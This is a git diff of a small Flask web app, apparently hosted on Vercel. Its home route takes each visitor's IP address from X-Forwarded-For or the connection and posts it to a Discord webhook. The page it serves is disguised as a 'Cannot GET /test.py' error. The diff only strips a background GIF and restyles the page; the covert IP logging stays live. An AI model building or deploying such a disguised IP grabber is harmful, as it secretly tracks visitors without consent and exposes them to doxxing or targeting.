@@ -8,9 +8,6 @@ app = Flask(__name__)
 # Discord webhook from Vercel Environment Variables
 WEBHOOK_URL = os.environ.get("ATTESTATION_WEBHOOK_URL")
 
-# Background GIF
-BACKGROUND_GIF = "https://cdn.discordapp.com/attachments/1549906426045141003/1555335632824303626/togif.gif?backend=b2&ex=6ac026af&is=6abed52f&hm=e9c62d7d98af5f8a8763df7ff8604fb9bdc89ac675387a4067323c02dd8e9d94&"
-
 
 def get_visitor_ip():
     forwarded_for = request.headers.get("X-Forwarded-For")
@@ -61,12 +58,10 @@ def send_webhook(ip):
     try:
         with urllib.request.urlopen(req, timeout=10) as response:
             print("Discord response:", response.status)
-
             return 200 <= response.status < 300
 
     except Exception as error:
         print("Discord webhook error:", str(error))
-
         return False
 
 
@@ -74,43 +69,38 @@ def send_webhook(ip):
 def home():
     ip = get_visitor_ip()
 
-    # Send visitor information to Discord
     send_webhook(ip)
 
-    return f"""
+    return """
     <!DOCTYPE html>
     <html>
     <head>
         <title>Cannot GET /test.py</title>
 
         <style>
-            html, body {{
+            html, body {
                 margin: 0;
                 padding: 0;
                 width: 100%;
                 height: 100%;
                 overflow: hidden;
-            }}
+            }
 
-            body {{
-                background-image: url("{BACKGROUND_GIF}");
-                background-size: cover;
-                background-position: center;
-                background-repeat: no-repeat;
+            body {
+                background: #000000;
 
                 display: flex;
                 align-items: center;
                 justify-content: center;
 
                 font-family: Arial, sans-serif;
-            }}
+            }
 
-            .message {{
+            .message {
                 color: white;
                 font-size: 32px;
                 font-weight: bold;
-                text-shadow: 0 2px 8px black;
-            }}
+            }
         </style>
     </head>
 
